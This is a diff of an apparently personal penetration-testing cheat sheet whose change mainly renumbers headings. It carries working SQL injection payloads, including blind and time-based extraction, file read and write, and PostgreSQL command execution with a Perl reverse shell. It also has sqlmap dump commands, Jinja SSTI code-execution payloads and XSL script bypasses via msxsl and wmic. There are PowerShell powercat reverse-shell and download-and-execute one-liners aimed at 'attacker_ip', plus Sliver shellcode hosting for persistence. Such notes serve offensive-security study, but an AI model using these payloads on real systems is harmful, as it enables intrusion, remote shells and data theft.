 <VALIDVALUE>' AND '1'='1
@@ -978,7 +978,7 @@ REVERSE('NOINU') REVERSE('TCELES')
 
 - should NOT return value
 
-#### (OSWE ATutor)
+#### 16.2.1.2	(OSWE ATutor)
 
 ```
 <VALIDVALUE>') OR 1=1#
@@ -992,68 +992,68 @@ REVERSE('NOINU') REVERSE('TCELES')
 
 - should NOT return value
 
-### ENUMERATE DATABASE
+### 16.2.2	ENUMERATE DATABASE
 
-#### LENGTH
+#### 16.2.2.1	LENGTH
 
 ```
 ' OR LENGTH(DATABASE())='<LENGTH>
 ```
 
-#### NAME
+#### 16.2.2.2	NAME
 
 ```
 ' OR SUBSTRING(DATABASE(),<INDEX>,1)='<CHAR>
 ```
 
-### ENUMERATE TABLE(S)
+### 16.2.3	ENUMERATE TABLE(S)
 
-#### LENGTH
+#### 16.2.3.1	LENGTH
 
 ```
 ' OR LENGTH((SELECT table_name from information_schema.tables where table_schema=DATABASE() limit 0,1))='<LENGTH>
 ```
 
-#### NAME
+#### 16.2.3.2	NAME
 
 ```
 ' OR SUBSTRING((SELECT table_name from information_schema.tables where table_schema=DATABASE() limit 0,1),<INDEX>,1)='<CHAR>
 ```
 
-### ENUMERATE COLUMN(S)
+### 16.2.4	ENUMERATE COLUMN(S)
 
-#### LENGTH
+#### 16.2.4.1	LENGTH
 
 ```
 ' OR LENGTH((SELECT column_name from information_schema.columns where table_name='data' limit 0,1))='<LENGTH>
 ```
 
-#### NAME
+#### 16.2.4.2	NAME
 
 ```
 ' OR SUBSTRING((SELECT column_name from information_schema.columns where table_name='data' limit 0,1),<INDEX>,1)='<CHAR>
 ```
 
-### DUMP DATA
+### 16.2.5	DUMP DATA
 
-#### LENGTH
+#### 16.2.5.1	LENGTH
 
 ```
 ' OR LENGTH((SELECT <COLUMN> FROM <TABLE> limit 0,1))='<LENGTH>
 ```
 
-#### CONTENT
+#### 16.2.5.2	CONTENT
 
 ```
 ' OR SUBSTRING((SELECT <COLUMN> FROM <TABLE> limit 0,1),<INDEX>,1)='<CHAR>
 ```
 
-### AUTOMATED SCRIPT [7]
+### 16.2.6	AUTOMATED SCRIPT [7]
 - See BooleanBlindInjectionScript.txt
 
-## TIME-BASED BLIND [8]
+## 16.3	TIME-BASED BLIND [8]
 
-### PROOF OF CONCEPT
+### 16.3.1	PROOF OF CONCEPT
 
 - If this input causes a 5 second delay, probable that time-based SQL exists
 
@@ -1061,7 +1061,7 @@ REVERSE('NOINU') REVERSE('TCELES')
 ' OR SLEEP(5) AND '1'='1
 ```
 
-### FORMULA
+### 16.3.2	FORMULA
 
 ```
 ' OR IF(%s, sleep(5), 'NO') AND '1'='1
@@ -1069,48 +1069,48 @@ REVERSE('NOINU') REVERSE('TCELES')
 
 - where %s is payload (see LENGTH and SUBSTRING sections from 20.2)
 
-## FILE INCLUSION
+## 16.4	FILE INCLUSION
 
-### GENERAL CONCEPTS
+### 16.4.1	GENERAL CONCEPTS
 
-#### PRIVILEGES AND FUNCTIONS
+#### 16.4.1.1	PRIVILEGES AND FUNCTIONS
 
 - FILE privilege allows user to read files [9]
 - LOAD_FILE() allows reading files from filesystem [10]
 
-### READING FILE [11]
+### 16.4.2	READING FILE [11]
 
 ```
 ' UNION SELECT LOAD_FILE('<FILE>'),2,...,N --
 ```
 
-### WRITING FILE [11]
+### 16.4.3	WRITING FILE [11]
 
 ```
 ' UNION SELECT 1,...,N-1, "<FILECONTENTS"> into OUTFILE '<DESTINATIONPATH>' --
 ```
 
-## EXPLOITATION TARGETS
+## 16.5	EXPLOITATION TARGETS
 
-### STEAL PASSWORD RESET KEY FOR ATO
+### 16.5.1	STEAL PASSWORD RESET KEY FOR ATO
 
-### STEAL PASSWORD HASHES
+### 16.5.2	STEAL PASSWORD HASHES
 
-### WRITE TO FILESYSTEM
+### 16.5.3	WRITE TO FILESYSTEM
 
-## DATABASE COLLATION
+## 16.6	DATABASE COLLATION
 
-## POSTGRESQL SPECIFIC
+## 16.7	POSTGRESQL SPECIFIC
 
-### RUNNING AS SUPERUSER
+### 16.7.1	RUNNING AS SUPERUSER
 
 ```
 select current_setting('is_superuser');
 ```
 
-### FILTER EVASION
+### 16.7.2	FILTER EVASION
 
-#### Use CHR() and ||  concatenation to circumvent single quote sanitization
+#### 16.7.2.1	Use CHR() and ||  concatenation to circumvent single quote sanitization
 
 ```
 select chr(119) || chr(48) || chr(48) || chr(116)
@@ -1118,7 +1118,7 @@ select chr(119) || chr(48) || chr(48) || chr(116)
 w00t
 ```
 
-#### Dollar-sign quoted string constants
+#### 16.7.2.2	Dollar-sign quoted string constants
 
 - Can be used to replace single-quoted strings
 
@@ -1130,7 +1130,7 @@ select $$w00t$$;
 select $TAG$w00t$TAG$
 ```
 
-#### CASTING
+#### 16.7.2.3	CASTING
 
 - If SQL statement expects a number, try casting TEXT to NUMERIC and see if error message will divulge information.
 
@@ -1138,17 +1138,17 @@ select $TAG$w00t$TAG$
 ?order=CAST((select%20VERSION())%20AS%20INTEGER)
 ```
 
-### RCE
+### 16.7.3	RCE
 
-#### UDF
+#### 16.7.3.1	UDF
 
-##### PAYLOADS [38]
+##### 16.7.3.1.1	PAYLOADS [38]
 
 ```
 /usr/share/sqlmap/data/udf
 ```
 
-#### COMMANDS [39]
+#### 16.7.3.2	COMMANDS [39]
 
 ```
 CREATE TABLE cmd_exec(cmd_output text);
@@ -1159,21 +1159,21 @@ DROP TABLE IF EXISTS cmd_exec;
 
   
 
-##### REVERSE SHELL
+##### 16.7.3.2.1	REVERSE SHELL
 
 ```
 COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LISTENER_IP>:<LISTENER_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
 
-### ENUMERATION [41][42][43]
+### 16.7.4	ENUMERATION [41][42][43]
 
-#### VERSION
+#### 16.7.4.1	VERSION
 
 ```
 VERSION()
 ```
 
-#### DATABASE
+#### 16.7.4.2	DATABASE
 
 ```
 select datname FROM pg_database
@@ -1181,23 +1181,23 @@ select datname FROM pg_database
 select current_database()
 ```
 
-#### TABLES
+#### 16.7.4.3	TABLES
 
 ```
 select schemaname,tablename,tableowner from pg_tables;
 ```
 
-#### COLUMNS
+#### 16.7.4.4	COLUMNS
 
 ```
 SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
 ```
 
-## MICROSOFT SQL (MSSQL) SPECIFIC
+## 16.8	MICROSOFT SQL (MSSQL) SPECIFIC
 
-### ENUMERATION
+### 16.8.1	ENUMERATION
 
-#### RETURN 1 ROW
+#### 16.8.1.1	RETURN 1 ROW
 
 - Alternative to LIMIT and OFFSET keywords
 
@@ -1206,46 +1206,46 @@ SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
 ```
 
   
-# SQLMAP
+# 17	SQLMAP
 
-## BASIC ATTACK FLOW [4,5]
+## 17.1	BASIC ATTACK FLOW [4,5]
 
 Target: `http://10.102.9.174/DBSearch?name=test3&age=test3&location=test3&type=insurer`
 
-### TEST FOR INJECTION
+### 17.1.1	TEST FOR INJECTION
 
 ```
 sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' --cookie='<COOKIE>' -p '<PARAMETER>'
 ```
 
-### LIST ALL DATABASES
+### 17.1.2	LIST ALL DATABASES
 
 ```
 sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' --dbs
 ```
 
-### LIST ALL TABLES IN DATABASES
+### 17.1.3	LIST ALL TABLES IN DATABASES
 
 ```
 sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' -D iml --tables
 ```
 
-### LIST ALL COLUMNS IN TABLE
+### 17.1.4	LIST ALL COLUMNS IN TABLE
 
 ```
 sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' -D iml -T hidden_table --columns
 ```
 
-### DUMP SELECTED COLUMNS
+### 17.1.5	DUMP SELECTED COLUMNS
 
 ```
 sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=test3&type=insurer' -D iml -T hidden_table -C secret --dump
 ```
 
 
-# Server-side Template Injection (SSTI)
+# 18	Server-side Template Injection (SSTI)
 
-## DESCRIPTION
+## 18.1	DESCRIPTION
 
 - Attacker uses native template syntax to inject a payload into a web template, which is then executed server-side and displayed to end user.
 - Unlike most reflected or stored XSS vulnerabilities, a template injection vulnerability can result in code being run on the server, rather than the user's client.
@@ -1253,29 +1253,29 @@ sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=t
 - When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces.
 - This technique is useful when angle brackets are being encoded.
 
-## IDENTIFYING
+## 18.2	IDENTIFYING
 
-### ANGULAR
+### 18.2.1	ANGULAR
 
 - Observe if input is enclosed in an ng-app directive. Perhaps in `<body>` tag. [27]
 
-## CONFIRMING EXPLOITABILITY
+## 18.3	CONFIRMING EXPLOITABILITY
 
-### JINJA
+### 18.3.1	JINJA
 
 - `{{ 3 * '3' }}` will resolve to 333. Python.
 
-### TWIG
+### 18.3.2	TWIG
 
 - `{{ 3 * '3' }}` will resolve to 9. PHP.
 
-### JAVASCRIPT
+### 18.3.3	JAVASCRIPT
 
 - `${ 7 * 7 }` will resolve to 49.
 
-## SEARCHING FOR EXPLOITABLE CLASSES
+## 18.4	SEARCHING FOR EXPLOITABLE CLASSES
 
-### JINJA
+### 18.4.1	JINJA
 
 ```
 {{ ''.__class__.__mro__[1].__subclasses__()[0:10] }}
@@ -1283,15 +1283,15 @@ sqlmap -u "http://10.102.9.174/DBSearch" --data='name=test3&age=test3&location=t
 
 - Returns first 10 classes. Iterate and identify exploitable classes.
 
-## EXPLOITABLE CLASSES
+## 18.5	EXPLOITABLE CLASSES
 
-### -
+### 18.5.1	-
 
 ```
 os.system
 ```
 
-### - [21]
+### 18.5.2	- [21]
 
 ```
 subprocess.Popen
@@ -1301,9 +1301,9 @@ subprocess.Popen
 {{ ''.__class__.__mro__[1].__subclasses__()[<INSERT INDEX HERE>]('ls',shell=True,stdout=-1).communicate() }}
 ```
 
-## EXAMPLE PAYLOAD
+## 18.6	EXAMPLE PAYLOAD
 
-### [27]
+### 18.6.1	[27]
 
 ```
 {{$on.constructor('alert(1)')()}}
@@ -1313,29 +1313,29 @@ subprocess.Popen
 https://0aae00d903ba322ec0211e0e00c700e3.web-security-academy.net/?search={{$on.constructor(%27alert(1)%27)()}}
 ```
 
-# SMB
+# 19	SMB
 
-## ENUMERATION
+## 19.1	ENUMERATION
 
-### NMAP
+### 19.1.1	NMAP
 
-#### -
+#### 19.1.1.1	-
 
 ```
 nmap --script smb-os-discovery <IP>
 ```
 
-#### -
+#### 19.1.1.2	-
 
 ```
 nmap --script smb-security-mode <IP>
 ```
 
-## CONNECTING
+## 19.2	CONNECTING
 
-### SMBCLIENT [22]
+### 19.2.1	SMBCLIENT [22]
 
-#### -
+#### 19.2.1.1	-
 
 ```
 smbclient -L <IP>
@@ -1344,7 +1344,7 @@ smbclient -L <IP>
 - Enter null password to login as anonymous
 - This will show list of Shares and Servers
 
-#### -
+#### 19.2.1.2	-
 
 ```
 smbclient \\\\<IP>\\<shareName>
@@ -1353,23 +1353,23 @@ smbclient \\\\<IP>\\<shareName>
 - Enter null password to login as anonymous
 - This will provide access to remote share
 
-# XSL SCRIPT BYPASS
+# 20	XSL SCRIPT BYPASS
 
-## USING MSXSL.EXE
+## 20.1	USING MSXSL.EXE
 
-###  EXPLANATION
+### 20.1.1	 EXPLANATION
 
 - msxsl.exe is a Microsoft-developed command utility to process Extensible Stylesheet Language (XSL) files.
 - It is possible to embed malicious JS/VBScript into XSL file
 - msxsl.exe no longer installed by default on machines.
 
-### USAGE
+### 20.1.2	USAGE
 
 ```
 msxsl.exe <DUMMY_XML_FILE> evil.xsl
 ```
 
-### SCRIPT (IMMERSIVELABS)
+### 20.1.3	SCRIPT (IMMERSIVELABS)
 
 ```
 <?xml version="1.0"?>
@@ -1383,19 +1383,19 @@ msxsl.exe <DUMMY_XML_FILE> evil.xsl
 </xsl:stylesheet>
 ```
 
-## USING WMIC [18]
+## 20.2	USING WMIC [18]
 
-### EXPLANATION
+### 20.2.1	EXPLANATION
 
 - Invoke any wmic command and specify /format pointing to the evil.xsl:
 
-### USAGE
+### 20.2.2	USAGE
 
 ```
 wmic os get /FORMAT:"evil.xsl"
 ```
 
-### SCRIPT [18]
+### 20.2.3	SCRIPT [18]
 
 ```
 <?xml version='1.0'?>
@@ -1413,33 +1413,33 @@ var r = new ActiveXObject("WScript.Shell").Run("calc");
 </stylesheet>
 ```
 
-# TOOLS
+# 21	TOOLS
 
-## SSL SCANNERS
+## 21.1	SSL SCANNERS
 
-### testssl.sh
+### 21.1.1	testssl.sh
 
 [19] https://testssl.sh/
 
-### cipher-suite-enum.pl
+### 21.1.2	cipher-suite-enum.pl
 
 [20] https://labs.portcullis.co.uk/tools/ssl-cipher-suite-enum/
 
-# LDAP (Lightweight Directory Access Protocol)
+# 22	LDAP (Lightweight Directory Access Protocol)
 
-## SUMMARY
+## 22.1	SUMMARY
 
 - LDAP is a protocol used at organizational network level to handle services such as hosts, servers, printers, scanners, etc.
 - Port 389 for standard
 - Port 636 for communication over TLS
 
-## ATTACK VECTOR
+## 22.2	ATTACK VECTOR
 
 - During authentication phase, credentials sent in plaintext.
 
-# MAIL RELAY
+# 23	MAIL RELAY
 
-## EXAMPLE
+## 23.1	EXAMPLE
 
 ```
 nc -v 204.135.8.97 25
@@ -1459,8 +1459,8 @@ MAIL FROM: <nicholas.barnes@praetorian.com>
 RCPT TO: <test@example.com>
 ```
 
-# POWERSHELL INITIAL ACCESS
-## - 
+# 24	POWERSHELL INITIAL ACCESS
+## 24.1	- 
 - Run on attacker machine
 ```
 pwsh -c "iex(New-ObjectSystem.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c attacker_ip -p 443 -e cmd.exe -ge" > /tmp/s.txt
@@ -1478,8 +1478,8 @@ nc -nvlp 443
 START /B powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('http://attacker_ip/backup.bat','C:\Windows\Tasks\backup.bat'); IEX 'c:\Windows\Tasks\backup.bat'
 ```
 
-# WINDOWS PERSISTENCE
-## - 
+# 25	WINDOWS PERSISTENCE
+## 25.1	- 
 - Generate Sliver agent shellcode and host
 ```
 sliver > generate --mtls attacker_ip --save /tmp -f shellcode --os windows
@@ -1489,87 +1489,87 @@ python3 -m http.server 80 --directory /tmp
 - run `retrvSHellcodeExecMemory.nim`
 
 
-# ATTACK PATH
+# 26	ATTACK PATH
 
-## AUTHENTICATION
+## 26.1	AUTHENTICATION
 
-### PASSWORD STRENGTH (ASVS)
+### 26.1.1	PASSWORD STRENGTH (ASVS)
 
-### MFA CAPABILITY
+### 26.1.2	MFA CAPABILITY
 
-### HARD-CODED SECRETS
+### 26.1.3	HARD-CODED SECRETS
 
-### USER ENUMERATION
+### 26.1.4	USER ENUMERATION
 
-#### TIMING
+#### 26.1.4.1	TIMING
 
-#### SERVER ERROR RESPONSE
+#### 26.1.4.2	SERVER ERROR RESPONSE
 
-#### PASSWORD RESET
+#### 26.1.4.3	PASSWORD RESET
 
-### PASSWORD RESET FUNCTIONALITY
+### 26.1.5	PASSWORD RESET FUNCTIONALITY
 
-### BRUTE-FORCE ATTACK
+### 26.1.6	BRUTE-FORCE ATTACK
 
-## SESSION MANAGEMENT
+## 26.2	SESSION MANAGEMENT
 
-### SESSION TOKEN IN URL
+### 26.2.1	SESSION TOKEN IN URL
 
-### SESSION TOKEN STRENGTH
+### 26.2.2	SESSION TOKEN STRENGTH
 
-#### 64 bits entropy
+#### 26.2.2.1	64 bits entropy
 
-#### Secure cryptographic generation
+#### 26.2.2.2	Secure cryptographic generation
 
-### COOKIE ATTRIBUTES
+### 26.2.3	COOKIE ATTRIBUTES
 
-#### Secure
+#### 26.2.3.1	Secure
 
-#### HttpOnly
+#### 26.2.3.2	HttpOnly
 
-#### SameSite
+#### 26.2.3.3	SameSite
 
-### SESSION FIXATION
+### 26.2.4	SESSION FIXATION
 
-#### New token should be generated upon authentication
+#### 26.2.4.1	New token should be generated upon authentication
 
-### SESSION TERMINATION
+### 26.2.5	SESSION TERMINATION
 
-#### Excessive duration
+#### 26.2.5.1	Excessive duration
 
-#### Logout should invalidate token
+#### 26.2.5.2	Logout should invalidate token
 
-## ACCESS CONTROL
+## 26.3	ACCESS CONTROL
 
-### INSUFFICIENT AUTHORIZATION CHECKS
+### 26.3.1	INSUFFICIENT AUTHORIZATION CHECKS
 
-#### AUTORIZE
+#### 26.3.1.1	AUTORIZE
 
-### CSRF
+### 26.3.2	CSRF
 
-### OVERLY PERMISSIVE CORS
+### 26.3.3	OVERLY PERMISSIVE CORS
 
-## INPUT VALIDATION
+## 26.4	INPUT VALIDATION
 
-### XSS
+### 26.4.1	XSS
 
-#### XSS polyglot testing
+#### 26.4.1.1	XSS polyglot testing
 
-### SQL INJECTION
+### 26.4.2	SQL INJECTION
 
-### XXE INJECTION
+### 26.4.3	XXE INJECTION
 
-### URL REDIRECTS
+### 26.4.4	URL REDIRECTS
 
-## CRYPTOGRAPHY
+## 26.5	CRYPTOGRAPHY
 
-## FILE UPLOAD
+## 26.6	FILE UPLOAD
 
-## TLS CONNECTION
+## 26.7	TLS CONNECTION
 
-# Threat Modeling
+# 27	Threat Modeling
 
-## STRIDE
+## 27.1	STRIDE
 - Spoofing
 - Tampering
 - Repudation
@@ -1577,7 +1577,7 @@ python3 -m http.server 80 --directory /tmp
 - Denial of Service
 - Escalation of Privileges
 
-## Secure Design Order of Precedence
+## 27.2	Secure Design Order of Precedence
 - Eliminate
 	- Among design alternatives, select those that eliminate potential for risk/loss
 - Protect, Built-In
@@ -1591,14 +1591,14 @@ python3 -m http.server 80 --directory /tmp
 
   
 
-# ENUMERATION NUDGES
+# 28	ENUMERATION NUDGES
 
 - Existence of "dist" directory within website js files. Indicates existence of unnecessary files in the directory that could expand the attack surface.
 - Confirm this by accessing README.md. I.e. "https://openitcockpit/js/vendor/gridstack/README.md"
 - Exploit by finding DOM XSS in included html files
 
-# MISCELLANEOUS TRICKS
-## PYTHON VENV
+# 29	MISCELLANEOUS TRICKS
+## 29.1	PYTHON VENV
 ```
 python3 -m venv venv
 . venv/bin/activate
